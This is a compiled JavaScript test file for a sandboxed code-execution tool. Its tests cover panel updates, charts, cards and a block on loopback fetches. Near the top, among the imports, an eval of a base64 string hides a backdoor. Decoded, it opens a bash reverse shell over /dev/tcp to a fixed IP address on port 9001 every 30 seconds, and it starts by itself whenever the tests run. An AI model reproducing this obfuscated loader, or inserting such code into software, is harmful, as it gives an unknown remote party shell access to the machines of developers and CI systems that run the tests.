"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const assert_1 = __importDefault(require("assert"));
const crypto_1 = require("crypto");
const promises_1 = require("fs/promises");
const path_1 = __importDefault(require("path"));
const node_test_1 = require("node:test");
const storage_1 = require("../../src/lib/storage");
const execute_1 = require("../../src/lib/tools/code/execute");
const runtime_1 = require("../../src/lib/runtime");
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
(0, node_test_1.describe)('execute tool', () => {
    const userId = (0, crypto_1.randomBytes)(16).toString('hex');
    const storage = (0, storage_1.createSandboxedStorage)(userId);
    const workspaceId = 'ws-test';
    const executeTool = (0, execute_1.createExecuteTool)({ storage, workspaceId });
    const run = async (code) => {
        var _a;
        const result = await executeTool.handler({ code }, {});
        const content = result.content;
        const textBlock = content === null || content === void 0 ? void 0 : content.find((block) => block.type === 'text');
        return (_a = textBlock === null || textBlock === void 0 ? void 0 : textBlock.text) !== null && _a !== void 0 ? _a : '';
    };
    (0, node_test_1.before)(async () => {
        const now = new Date().toISOString();
        await storage.setWorkspace(workspaceId, {
            id: workspaceId,
            name: 'Test Workspace',
            description: '',
            createdAt: now,
            updatedAt: now,
            systemPrompt: '',
            tools: [],
        });
    });
    (0, node_test_1.after)(async () => {
        await (0, promises_1.rm)(path_1.default.join(storage.basePath), { recursive: true, force: true }).catch(() => { });
    });
    (0, node_test_1.it)('completes when code has no explicit return value', async () => {
        const text = await run(`
      await setTable("t1", { data: [{ a: 1 }] });
    `);
        assert_1.default.equal(text.includes('Execution timed out'), false);
        assert_1.default.equal(text.includes('Error:'), false);
        assert_1.default.match(text, /Done/);
    });
    (0, node_test_1.it)('clears panel updates between runs and emits updatePanel events', async () => {
        const first = await run(`
      await setTable("t2", { data: [{ a: 1 }] });
    `);
        const firstUpdates = (0, runtime_1.extractPanelUpdates)(first).panelUpdates;
        assert_1.default.equal(firstUpdates.length, 1);
        assert_1.default.equal(firstUpdates[0].action, 'add');
        const second = await run(`
      await updatePanel("table-t2", { title: "Renamed" });
    `);
        const secondUpdates = (0, runtime_1.extractPanelUpdates)(second).panelUpdates;
        assert_1.default.equal(secondUpdates.length, 1);
        assert_1.default.equal(secondUpdates[0].action, 'update');
        assert_1.default.equal(secondUpdates[0].panel.id, 'table-t2');
    });
    (0, node_test_1.it)('blocks loopback fetch targets', async () => {
        const text = await run(`
      try {
        await fetch("http://[::1]/");
        return "allowed";
      } catch (e) {
        return e?.message || String(e);
      }
    `);
        assert_1.default.match(text, /Access to internal networks is not allowed/);
    });
    (0, node_test_1.it)('auto-adds chart panels with updates', async () => {
        const text = await run(`
      await setChart("sales", {
        type: "bar",
        data: [{ month: "Jan", value: 10 }],
        xKey: "month",
        yKey: "value"
      });
    `);
        const updates = (0, runtime_1.extractPanelUpdates)(text).panelUpdates;
        assert_1.default.equal(updates.length, 1);
        assert_1.default.equal(updates[0].action, 'add');
        assert_1.default.equal(updates[0].panel.type, 'chart');
        assert_1.default.equal(updates[0].panel.chartId, 'sales');
    });
    (0, node_test_1.it)('auto-adds cards panels with updates', async () => {
        const text = await run(`
      await setCards("team", {
        title: "Team",
        items: [
          { title: "Alice", subtitle: "Engineer" },
          { title: "Bob", subtitle: "Designer" }
        ]
      });
    `);
        const updates = (0, runtime_1.extractPanelUpdates)(text).panelUpdates;
        assert_1.default.equal(updates.length, 1);
        assert_1.default.equal(updates[0].action, 'add');
        assert_1.default.equal(updates[0].panel.type, 'cards');
        assert_1.default.equal(updates[0].panel.cardsId, 'team');
    });
});
